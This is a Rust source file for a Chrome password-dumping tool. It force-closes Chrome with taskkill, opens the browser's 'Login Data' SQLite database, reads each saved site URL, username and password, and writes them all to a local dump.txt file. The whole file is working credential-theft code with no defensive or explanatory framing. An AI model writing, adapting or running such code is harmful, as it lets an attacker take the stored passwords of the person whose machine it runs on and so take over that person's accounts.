use crate::models::ChromeAccount;
use app_dirs::{get_app_dir, AppDataType, AppInfo};
use rusqlite::{Connection, Error, NO_PARAMS};
use std::fs::File;
use std::io::Write;
use std::path::Path;
use std::process::Command;

const STMT: &'static str = "SELECT action_url, username_value, password_value FROM logins";

pub fn close_chrome() {
    Command::new("taskkill")
        .args(&["/F", "/IM", "chrome.exe"])
        .output()
        .expect("There was an error closing google chrome!");
}

fn find_chrome_path() -> Box<Path> {
    let app_info = AppInfo {
        name: "Chrome",
        author: "Google",
    };
    let path_buf = get_app_dir(
        AppDataType::UserCache,
        &app_info,
        "User Data/Default/Login Data",
    )
    .expect("No chrome found!");

    path_buf.into_boxed_path()
}

fn query_accounts() -> Result<Vec<ChromeAccount>, Error> {
    let db_url = find_chrome_path();
    let conn = Connection::open(db_url).expect("Login Data not found!");

    let mut stmt = conn.prepare(STMT)?;

    let chrome_accounts = stmt
        .query_map(NO_PARAMS, |row| {
            Ok(ChromeAccount::new(row.get(0)?, row.get(1)?, row.get(2)?))
        })
        .unwrap()
        .map(|acc| acc.unwrap())
        .collect();

    return Ok(chrome_accounts);
}

pub fn dump_to_file() {
    let final_str: String = query_accounts()
        .unwrap()
        .iter_mut()
        .map(|acc| format!("{}\r\n", acc.humanize()))
        .collect();

    let mut file = File::create("./dump.txt").expect("Unable to create file");
    let res = file.write_all(final_str.as_bytes());
    match res {
        Ok(_) => println!("Dumped!"),
        Err(_) => panic!("Dump failed!"),
    };
}
